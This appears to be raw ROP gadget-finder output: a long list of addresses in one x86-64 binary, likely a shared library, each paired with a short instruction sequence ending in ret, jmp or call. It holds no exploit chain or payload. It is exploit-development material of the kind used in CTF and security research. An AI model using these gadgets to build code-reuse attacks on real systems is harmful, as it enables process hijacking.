0x00002aaaaac073ab : add byte ptr [rdx + 5], bh ; call 0x2e628
0x00002aaaaaaf689f : add byte ptr [rdx + 8], bh ; mov eax, edx ; ret
0x00002aaaaabdd9c3 : add byte ptr [rdx + rax + 0x5d], dh ; ret
0x00002aaaaac801bb : add byte ptr [rdx + rax - 0x1abfffff], al ; call qword ptr [rsi]
0x00002aaaaac781f3 : add byte ptr [rdx + rax*4 + 0x59680000], bh ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac7c153 : add byte ptr [rdx + rax*8], bl ; add byte ptr [rax], al ; call 0x281a6b8e
0x00002aaaaac7c16b : add byte ptr [rdx + rax*8], dh ; add byte ptr [rax], al ; add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaac6c0ef : add byte ptr [rdx + rbp*2 - 0x12], al ; jmp rsp
0x00002aaaaab09c5c : add byte ptr [rdx + rbp*8 - 0xd], dh ; ret
0x00002aaaaac7e983 : add byte ptr [rdx + rbp*8], cl ; add byte ptr [rax - 7], bh ; int1 ; call rsi
0x00002aaaaac72993 : add byte ptr [rdx + rbp], bl ; add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaac72963 : add byte ptr [rdx + rbp], ch ; add byte ptr [rax], al ; pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac8d993 : add byte ptr [rdx + rbx*8 + 1], bl ; add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaac7194b : add byte ptr [rdx + rbx], dl ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaac76ec3 : add byte ptr [rdx + rbx], dl ; add byte ptr [rax], al ; or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaabeb15b : add byte ptr [rdx + rcx + 0x5b], dh ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaab6b0c3 : add byte ptr [rdx + rcx + 0x5b], dh ; pop rbp ; pop r12 ; ret
0x00002aaaaac51177 : add byte ptr [rdx + rcx + 0xabf0000], bh ; add byte ptr [rax], al ; ret 0xa
0x00002aaaaac6d657 : add byte ptr [rdx + rcx - 0xa], ah ; jmp rsp
0x00002aaaaac849bb : add byte ptr [rdx + rcx*2 + 0x5b200001], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac849eb : add byte ptr [rdx + rcx*2 + 0x5b500001], dh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84973 : add byte ptr [rdx + rcx*2], bh ; add dword ptr [rax], eax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac789a3 : add byte ptr [rdx + rcx*4], ch ; add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac7b98b : add byte ptr [rdx + rdi*4], dl ; add byte ptr [rax + 0x73], dh ; out dx, eax ; call rax
0x00002aaaaac8f98b : add byte ptr [rdx + rdi*8 + 1], dl ; add byte ptr [rax + 0x47], ah ; clc ; call qword ptr [rbx]
0x00002aaaaac811a3 : add byte ptr [rdx + rdx + 1], ch ; add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac811eb : add byte ptr [rdx + rdx - 0x25dfffff], dh ; jmp qword ptr [rcx]
0x00002aaaaac811d3 : add byte ptr [rdx + rdx - 0x25f7ffff], bl ; jmp qword ptr [rcx]
0x00002aaaaac811bb : add byte ptr [rdx + rdx - 0x260fffff], al ; jmp qword ptr [rcx]
0x00002aaaaac851cb : add byte ptr [rdx + rdx*2 + 0x73f00001], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac851b3 : add byte ptr [rdx + rdx*2 + 1], bh ; add al, bl ; jae 0x1b01b8 ; jmp qword ptr [rcx]
0x00002aaaaac85183 : add byte ptr [rdx + rdx*2 + 1], cl ; add byte ptr [rax + 0x73], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6ef0f : add byte ptr [rdx + rdx*2], ah ; stc ; call rsp
0x00002aaaaac85153 : add byte ptr [rdx + rdx*2], bl ; add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac6cbdf : add byte ptr [rdx + rdx*2], dl ; call rsp
0x00002aaaaac7917b : add byte ptr [rdx + rdx*4], al ; add al, al ; add bh, ch ; jmp rsp
0x00002aaaaac6c5e7 : add byte ptr [rdx + rdx*4], al ; out dx, eax ; jmp rsp
0x00002aaaaac81163 : add byte ptr [rdx + rdx], ch ; add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaac831a3 : add byte ptr [rdx + rsi + 1], ch ; add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac6c44f : add byte ptr [rdx + rsi - 0x11], dl ; call rsp
0x00002aaaaac831f3 : add byte ptr [rdx + rsi - 0x1877ffff], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6c1a7 : add byte ptr [rdx + rsi*2], al ; out dx, al ; call rsp
0x00002aaaaac7f1c3 : add byte ptr [rdx + rsi*8 + 0x19f80000], cl ; jmp qword ptr [rcx]
0x00002aaaaac7f4a0 : add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac5c470 : add byte ptr [rdx + rsi*8], al ; jmp qword ptr [rax]
0x00002aaaaac83143 : add byte ptr [rdx + rsi], cl ; add dword ptr [rax], eax ; fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaab92fb2 : add byte ptr [rdx - 0x73], cl ; or al, 0x20 ; mov rdx, rax ; jmp 0xbdfc7
0x00002aaaaab0001d : add byte ptr [rdx - 0x75], cl ; add al, 0xf0 ; test rax, rax ; je 0x2b033 ; call rax
0x00002aaaaabe13d7 : add byte ptr [rdx - 1], bh ; mov eax, edx ; ret
0x00002aaaaab0f6ee : add byte ptr [rdx - 1], bh ; test eax, eax ; cmovs eax, edx ; pop rbx ; ret
0x00002aaaaabe13d6 : add byte ptr [rdx - 1], dil ; mov eax, edx ; ret
0x00002aaaaac90770 : add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaab112c5 : add byte ptr [rdx], ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaac6f4f7 : add byte ptr [rdx], ah ; cli ; call rsp
0x00002aaaaac6ee3d : add byte ptr [rdx], al ; add ah, dh ; cmp edi, ecx ; jmp rsp
0x00002aaaaaba1221 : add byte ptr [rdx], al ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaab02e86 : add byte ptr [rdx], al ; add byte ptr [rax], al ; ret
0x00002aaaaabfc766 : add byte ptr [rdx], al ; add rsp, 8 ; ret
0x00002aaaaabe32f7 : add byte ptr [rdx], al ; call rax
0x00002aaaaac697d4 : add byte ptr [rdx], al ; cld ; jmp rax
0x00002aaaaab02d94 : add byte ptr [rdx], al ; movzx eax, ax ; ret
0x00002aaaaaad54af : add byte ptr [rdx], al ; or al, byte ptr [rcx] ; or al, 0x80 ; push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaac82b88 : add byte ptr [rdx], al ; or dword ptr [rsi], 0x54028310 ; ret
0x00002aaaaaad75af : add byte ptr [rdx], al ; xchg dh, ch ; ret 0x88ad
0x00002aaaaac9112f : add byte ptr [rdx], bh ; add byte ptr [rax], al ; add byte ptr [rcx + 6], dl ; add byte ptr [rax], al ; ret 2
0x00002aaaaac699b4 : add byte ptr [rdx], ch ; cld ; jmp rax
0x00002aaaaabd93c9 : add byte ptr [rdx], cl ; add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd903f : add byte ptr [rdx], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac692c0 : add byte ptr [rdx], dh ; sti ; jmp qword ptr [rax + 0x40fffb33]
0x00002aaaaac692a0 : add byte ptr [rip + 0x26a0fffb], ah ; sti ; inc dword ptr [rax + 0x28] ; sti ; jmp rax
0x00002aaaaac5c4b4 : add byte ptr [rip + 0x510fff2], al ; jmp qword ptr [rax]
0x00002aaaaaad5450 : add byte ptr [rip + 0xc1c107c], al ; ret 0x4412
0x00002aaaaac03efa : add byte ptr [rip - 0x76b40000], al ; ret
0x00002aaaaaba0b41 : add byte ptr [rip - 0xfff], bh ; jae 0xcbb52 ; ret
0x00002aaaaab7ae35 : add byte ptr [rsi + 0x2e], ah ; nop dword ptr [rax + rax] ; ret
0x00002aaaaac0c0d7 : add byte ptr [rsi + 0xe], bh ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac1ea45 : add byte ptr [rsi + 0xf], ah ; cmp ah, byte ptr [rbx - 0x35] ; add cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xf40
0x00002aaaaac42b64 : add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaabb512f : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xddeb
0x00002aaaaabb5112 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ror byte ptr [rax - 0x7d], 1 ; ret 0x4101
0x00002aaaaab09ab7 : add byte ptr [rsi + 0xf], ah ; push rsp ; ret 0xf66
0x00002aaaaab09b2f : add byte ptr [rsi + 0xf], ah ; sub cl, al ; add rsp, 0x28 ; ret
0x00002aaaaab7344c : add byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaab62e94 : add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x00002aaaaab73471 : add byte ptr [rsi + 0xf], ah ; xlatb ; ror dword ptr [rdi], -0x43 ; ror byte ptr [rax + 1], 0xf8 ; ret
0x00002aaaaaaddfc7 : add byte ptr [rsi + 1], ah ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaabd7aa5 : add byte ptr [rsi + 1], bh ; call rbx
0x00002aaaaabd7c92 : add byte ptr [rsi + 1], bh ; mov rdi, r12 ; call rbx
0x00002aaaaabd7b5e : add byte ptr [rsi + 1], bh ; mov rdi, r13 ; call rbx
0x00002aaaaabd7ad6 : add byte ptr [rsi + 1], bh ; mov rdi, r14 ; call rbx
0x00002aaaaac8e5a3 : add byte ptr [rsi + 1], ch ; add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaaadb99f : add byte ptr [rsi + 1], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac825ab : add byte ptr [rsi + 1], dh ; add al, dl ; cmpsd dword ptr [rsi], dword ptr [rdi] ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabd7f10 : add byte ptr [rsi + 2], bh ; mov rdi, r12 ; call rbx
0x00002aaaaabd7c83 : add byte ptr [rsi + 2], bh ; mov rdi, r13 ; call rbx
0x00002aaaaabd7b4f : add byte ptr [rsi + 2], bh ; mov rdi, r14 ; call rbx
0x00002aaaaabd7ac7 : add byte ptr [rsi + 2], bh ; mov rdi, r15 ; call rbx
0x00002aaaaabcacf7 : add byte ptr [rsi + 6], dh ; ret
0x00002aaaaabd68ff : add byte ptr [rsi + rax + 0x5b], dh ; ret
0x00002aaaaac905b3 : add byte ptr [rsi + rax + 2], bh ; add byte ptr [rax - 0x79], ch ; sti ; call rcx
0x00002aaaaac48747 : add byte ptr [rsi + rax - 0x17], dh ; adc dword ptr [rax], eax ; add byte ptr [rax], al ; nop ; ret
0x00002aaaaabd58b7 : add byte ptr [rsi + rax - 0x77], dh ; cmp eax, 0x2c2950 ; ret
0x00002aaaaaba1f0c : add byte ptr [rsi + rax*2 - 0x48], dh ; and byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac6ae7f : add byte ptr [rsi + rax*4 - 0x17], dh ; jmp rsp
0x00002aaaaac6c11f : add byte ptr [rsi + rbp*2], ah ; out dx, al ; call rsp
0x00002aaaaac7ad7b : add byte ptr [rsi + rbp*4], al ; add al, ah ; mov dh, ch ; call qword ptr [rsi]
0x00002aaaaac7adab : add byte ptr [rsi + rbp*4], dh ; add al, ah ; mov dh, ch ; jmp rbx
0x00002aaaaac7eddb : add byte ptr [rsi + rbp*8 + 0xa300000], ah ; call rsi
0x00002aaaaac71dd3 : add byte ptr [rsi + rbx + 0x56780000], bl ; jmp 0x1b90e7
0x00002aaaaac81da3 : add byte ptr [rsi + rbx + 1], ch ; add al, cl ; nop ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81dbb : add byte ptr [rsi + rbx - 0x6f1fffff], al ; hlt ; call qword ptr [rcx]
0x00002aaaaac85ddb : add byte ptr [rsi + rbx*2 - 0x5fcfffff], ah ; cmc ; call rdi
0x00002aaaaac7dd63 : add byte ptr [rsi + rbx*8], ch ; add byte ptr [rax], al ; sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac7dd4b : add byte ptr [rsi + rbx*8], dl ; add byte ptr [rax], al ; add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac8f128 : add byte ptr [rsi + rcx + 0x10], bl ; add dword ptr [rdx], 0x51 ; ret
0x00002aaaaac84dc3 : add byte ptr [rsi + rcx*2 + 0x6ea80001], cl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84ddb : add byte ptr [rsi + rcx*2 + 0x6ec00001], ah ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84df3 : add byte ptr [rsi + rcx*2 + 0x6ed80001], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84d4b : add byte ptr [rsi + rcx*2], dl ; add dword ptr [rax], eax ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac78dab : add byte ptr [rsi + rcx*4], dh ; add al, dl ; mov ebp, ebp ; jmp qword ptr [rbx]
0x00002aaaaac83dbb : add byte ptr [rsi + rdi + 0x1f100001], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83dd3 : add byte ptr [rsi + rdi + 0x1f280001], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83deb : add byte ptr [rsi + rdi + 0x1f400001], dh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac73deb : add byte ptr [rsi + rdi + 0x44400000], dh ; cli ; jmp qword ptr [rcx]
0x00002aaaaac7bd4b : add byte ptr [rsi + rdi*4], dl ; add byte ptr [rax], al ; and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaac83d5b : add byte ptr [rsi + rdi], ah ; add dword ptr [rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab45334 : add byte ptr [rsi + rdx + 0x48], dh ; add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaac855db : add byte ptr [rsi + rdx*2 + 0x7b300001], ah ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac855f3 : add byte ptr [rsi + rdx*2 + 0x7b480001], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8557b : add byte ptr [rsi + rdx*2 + 1], al ; add al, dl ; jp 0x1b0580 ; jmp qword ptr [rcx]
0x00002aaaaac85593 : add byte ptr [rsi + rdx*2 + 1], bl ; add al, ch ; jp 0x1b0598 ; jmp qword ptr [rcx]
0x00002aaaaac6f70f : add byte ptr [rsi + rdx*2], ah ; cli ; jmp rsp
0x00002aaaaac7d5f3 : add byte ptr [rsi + rdx*8 + 0x1fb80000], bh ; int1 ; call qword ptr [rsi]
0x00002aaaaab45832 : add byte ptr [rsi + rsi + 0x48], dh ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6da57 : add byte ptr [rsi + rsi*2 - 0xa], dh ; jmp rsp
0x00002aaaaac8f57b : add byte ptr [rsi + rsi*8 + 1], al ; add byte ptr [rax], dl ; xchg eax, edi ; sti ; jmp qword ptr [rdx]
0x00002aaaaac7f543 : add byte ptr [rsi + rsi*8], cl ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac72410 : add byte ptr [rsi - 0x17], bh ; jmp qword ptr [rsi]
0x00002aaaaac825f3 : add byte ptr [rsi - 0x57e7ffff], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac825db : add byte ptr [rsi - 0x57ffffff], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaaaf6a2d : add byte ptr [rsi - 0x70], ah ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4cefd : add byte ptr [rsi - 0x70], ah ; mov eax, dword ptr [rdi] ; shr eax, 4 ; and eax, 1 ; ret
0x00002aaaaab0b86d : add byte ptr [rsi - 0x70], ah ; mov eax, dword ptr [rip + 0x38c816] ; ret
0x00002aaaaac3b0df : add byte ptr [rsi - 0x75], ah ; add dword ptr [rsi - 0x77], esp ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaab0a001 : add byte ptr [rsi - 0x77], ah ; and al, 0xf0 ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaac067be : add byte ptr [rsi - 0x77], ah ; insb byte ptr [rdi], dx ; mov eax, 1 ; ret
0x00002aaaaac6e557 : add byte ptr [rsi - 9], dl ; jmp rsp
0x00002aaaaab0b139 : add byte ptr [rsi], ah ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaac4107c : add byte ptr [rsi], al ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaaaf4b0c : add byte ptr [rsi], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6b71f : add byte ptr [rsi], al ; jmp 0x196727
0x00002aaaaac692d8 : add byte ptr [rsi], bh ; sti ; call rax
0x00002aaaaac82543 : add byte ptr [rsi], cl ; add dword ptr [rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac6f857 : add byte ptr [rsi], dh ; cli ; call rsp
0x00002aaaaac170b9 : add byte ptr [rsi], dl ; add byte ptr [rax], al ; add byte ptr [rax + 0x16], bh ; ret
0x00002aaaaabcf9c9 : add byte ptr [rsi], dl ; add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x00002aaaaabd0e42 : add byte ptr [rsi], dl ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaab0a489 : add byte ptr [rsi], dl ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaab42f7b : add byte ptr [rsi], dl ; add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaac8f270 : add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaac8639b : add byte ptr [rsp + 1], ah ; add byte ptr [rax - 0x46], dl ; cmc ; call rsi
0x00002aaaaabca369 : add byte ptr [rsp + rax - 0xd], dh ; ret
0x00002aaaaac803d3 : add byte ptr [rsp + rax - 0xfe7ffff], bl ; call rcx
0x00002aaaaab9e3ca : add byte ptr [rsp + rax*2 - 0x77], ah ; add cl, byte ptr [rcx - 0x3b7cb710] ; ret
0x00002aaaaac9340f : add byte ptr [rsp + rax], ah ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 3
0x00002aaaaac90343 : add byte ptr [rsp + rax], cl ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac7ebb3 : add byte ptr [rsp + rbp*8], bh ; add byte ptr [rax], cl ; add esi, edx ; call rdi
0x00002aaaaac81beb : add byte ptr [rsp + rbx - 0x784fffff], dh ; hlt ; call qword ptr [rax]
0x00002aaaaab45f01 : add byte ptr [rsp + rcx + 0x48], dh ; add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaabd55d3 : add byte ptr [rsp + rcx - 9], dh ; ret 0xfc07
0x00002aaaaac84bbb : add byte ptr [rsp + rcx*2 + 0x6cd00001], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84bd3 : add byte ptr [rsp + rcx*2 + 0x6ce80001], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84beb : add byte ptr [rsp + rcx*2 + 0x6d000001], dh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84b8b : add byte ptr [rsp + rcx*2 + 1], dl ; add al, al ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabbfd48 : add byte ptr [rsp + rcx*2 - 0x75], ah ; cmp byte ptr [rcx - 0x75], cl ; or byte ptr [r8 - 0x77], r9b ; ret 0x8948
0x00002aaaaac6b9c7 : add byte ptr [rsp + rcx*4 - 0x13], ah ; jmp rsp
0x00002aaaaac7bb83 : add byte ptr [rsp + rdi*4], cl ; add al, ch ; frndint ; call qword ptr [rax]
0x00002aaaaac6a764 : add byte ptr [rsp + rdi*8 - 0x3546f01], ch ; jmp qword ptr [rax]
0x00002aaaaac7fbdb : add byte ptr [rsp + rdi*8 - 0x59600000], ah ; call rdi
0x00002aaaaac69fd0 : add byte ptr [rsp + rdi*8], dh ; jmp qword ptr [rax]
0x00002aaaaac6bcf7 : add byte ptr [rsp + rdi*8], dl ; in eax, dx ; call rsp
0x00002aaaaac713c3 : add byte ptr [rsp + rdx + 0x6f680000], cl ; std ; call qword ptr [rcx]
0x00002aaaaac853e3 : add byte ptr [rsp + rdx*2 + 0x78580001], ch ; cmc ; jmp qword ptr [rbx]
0x00002aaaaac6c617 : add byte ptr [rsp + rdx*4], dh ; out dx, eax ; call rsp
0x00002aaaaac6bc0f : add byte ptr [rsp + rdx*8], ah ; in eax, dx ; jmp rsp
0x00002aaaaac83393 : add byte ptr [rsp + rsi + 1], bl ; add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833ab : add byte ptr [rsp + rsi + 1], dh ; add byte ptr [rax - 0x14], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833c3 : add byte ptr [rsp + rsi - 0x1397ffff], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6da07 : add byte ptr [rsp + rsi*2 - 0xa], al ; jmp rsp
0x00002aaaaac6d78f : add byte ptr [rsp - 0xa], dl ; call rsp
0x00002aaaaac6ce1f : add byte ptr [rsp - 0xd], dl ; jmp rsp
0x00002aaaaac8a3d3 : add byte ptr [rsp - 0xe57ffff], bl ; sti ; call rcx
0x00002aaaaac6e507 : add byte ptr [rsp - 9], dh ; push rsp ; ret 1
0x00002aaaaab2ace8 : add byte ptr cs:[rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac73ded : add byte ptr ds:[rax], al ; cli ; jmp qword ptr [rcx]
0x00002aaaaabd68fe : add byte ptr ds:[rsi + rax + 0x5b], dh ; ret
0x00002aaaaab0b13a : add byte ptr es:[rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaac84110 : add byte ptr fs:[rax], al ; add ah, bl ; add dword ptr [r8], eax ; call 0x241ae650
0x00002aaaaac7b7c8 : add byte ptr fs:[rax], al ; add byte ptr [rax + rdi*4 + 0x1e00000], dl ; out dx, eax ; jmp rsi
0x00002aaaaabda3d8 : add byte ptr fs:[rax], al ; add byte ptr [rbx - 0x3f7ac7c0], cl ; cmove eax, edx ; ret
0x00002aaaaac7e6f0 : add byte ptr fs:[rax], al ; add byte ptr [rdi - 0x10d80000], bh ; int1 ; jmp rcx
0x00002aaaaac905b0 : add byte ptr fs:[rax], al ; add byte ptr [rsi + rax + 2], bh ; add byte ptr [rax - 0x79], ch ; sti ; call rcx
0x00002aaaaab4f360 : add byte ptr gs:[rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaaaf7bac : add byte ptr gs:[rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab45983 : add byte ptr gs:[rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab314f8 : add byte ptr ss:[rax - 0x39], cl ; ret 0xfffe
0x00002aaaaac0b794 : add byte ptr ss:[rax], al ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaac7357d : add byte ptr ss:[rax], al ; or ah, 0xe9 ; call qword ptr [rsi]
0x00002aaaaac69760 : add ch, 0xfb ; call rax
0x00002aaaaac5b244 : add ch, ah ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac46e4f : add ch, al ; cli ; jg 0x171e65 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaac0ae2f : add ch, al ; jmp 0x135e03
0x00002aaaaabb270a : add ch, al ; nop ; and esp, esi ; dec dword ptr [rcx - 0x77] ; ret 0x8949
0x00002aaaaabb83fc : add ch, al ; out dx, al ; ret
0x00002aaaaab0a0d7 : add ch, bl ; fpatan ; ret
0x00002aaaaab73192 : add ch, bl ; movsd dword ptr [rdi], dword ptr [rsi] ; mov rcx, rax ; xor eax, eax ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaac696bc : add ch, bl ; sti ; jmp rax
0x00002aaaaac5a23c : add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaac5a23d : add ch, byte ptr [rbp + rbp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaab2b800 : add ch, byte ptr [rbx] ; add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0x83 ; ret
0x00002aaaaab9185c : add ch, byte ptr [rcx] ; ret 0x48d
0x00002aaaaab47e8a : add ch, byte ptr [rcx] ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x00002aaaaac6a638 : add ch, byte ptr [rdx - 0x566d0004] ; cld ; jmp qword ptr [rdx]
0x00002aaaaabfc764 : add ch, byte ptr [rdx] ; add byte ptr [rdx], al ; add rsp, 8 ; ret
0x00002aaaaab2b840 : add ch, byte ptr [rip - 0x7d000000] ; ret
0x00002aaaaac5c26c : add ch, ch ; int1 ; call qword ptr [rax]
0x00002aaaaab0af96 : add cl, 0xe9 ; add esi, ebx ; stosq qword ptr [rdi], rax ; ret
0x00002aaaaabb90b7 : add cl, al ; call 0x66d0c9cb
0x00002aaaaab0b882 : add cl, al ; cmp byte ptr [rax], al ; ret
0x00002aaaaabed817 : add cl, al ; out 0x10, eax ; movzx eax, si ; or eax, edi ; bswap eax ; ret
0x00002aaaaab27fc1 : add cl, bl ; in eax, -0x21 ; loopne 0x52f56 ; ret 0xe680
0x00002aaaaab29f3a : add cl, bl ; in eax, -0x21 ; loopne 0x54ecf ; ret 0xe680
0x00002aaaaac696d4 : add cl, bl ; sti ; jmp rax
0x00002aaaaabda235 : add cl, byte ptr [r8 + 0x39] ; ret 0xf48
0x00002aaaaab76efc : add cl, byte ptr [r8 - 0x76b7fdbe] ; clc ; ret
0x00002aaaaab2c15e : add cl, byte ptr [rax + 0x29] ; ret
0x00002aaaaab80e19 : add cl, byte ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab11964 : add cl, byte ptr [rax + 0x29] ; ret 0x8949
0x00002aaaaab1198d : add cl, byte ptr [rax + 0x29] ; ret 0x8d48
0x00002aaaaaafbb13 : add cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaabf78d6 : add cl, byte ptr [rax + 0x39] ; ret 0x1472
0x00002aaaaabf78e4 : add cl, byte ptr [rax + 0x39] ; ret 0xc019
0x00002aaaaabda236 : add cl, byte ptr [rax + 0x39] ; ret 0xf48
0x00002aaaaab49079 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x00002aaaaaaff293 : add cl, byte ptr [rax + 1] ; ret 0x394c
0x00002aaaaabda3bb : add cl, byte ptr [rax - 0x39] ; ret 0xffff
0x00002aaaaab94690 : add cl, byte ptr [rax - 0x46] ; ret
0x00002aaaaab7a9e9 : add cl, byte ptr [rax - 0x73] ; jg 0xa59fb ; jne 0xa628b ; ret
0x00002aaaaab7c08d : add cl, byte ptr [rax - 0x73] ; jg 0xa709f ; jne 0xa7a9b ; ret
0x00002aaaaabe31ea : add cl, byte ptr [rax - 0x75] ; push rsp ; and al, 0x10 ; mov rsi, qword ptr [rsp + 8] ; call rax
0x00002aaaaab76efd : add cl, byte ptr [rax - 0x76b7fdbe] ; clc ; ret
0x00002aaaaab72d77 : add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaab45caf : add cl, byte ptr [rax - 0x77] ; ret
0x00002aaaaab51842 : add cl, byte ptr [rax - 0x7b] ; sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x00002aaaaabd3e62 : add cl, byte ptr [rax - 0x7b] ; sal byte ptr [rbx + rcx + 0x48], 0x83 ; ret 0x4808
0x00002aaaaab1e45c : add cl, byte ptr [rax - 0x7d] ; ret 0x4101
0x00002aaaaab5de40 : add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x00002aaaaaafa654 : add cl, byte ptr [rax - 0x7d] ; ret 0x4901
0x00002aaaaaba36b7 : add cl, byte ptr [rax - 0x7d] ; ret 0x8301
0x00002aaaaab5dea3 : add cl, byte ptr [rax - 0x7d] ; ret 0xe908
0x00002aaaaac102b5 : add cl, byte ptr [rax - 0x7d] ; ret 0xf04
0x00002aaaaab474b1 : add cl, byte ptr [rax - 9] ; fiadd dword ptr [rbx + 0x394803e2] ; ret 0xf48
0x00002aaaaac78658 : add cl, byte ptr [rbp + 0xa] ; ret
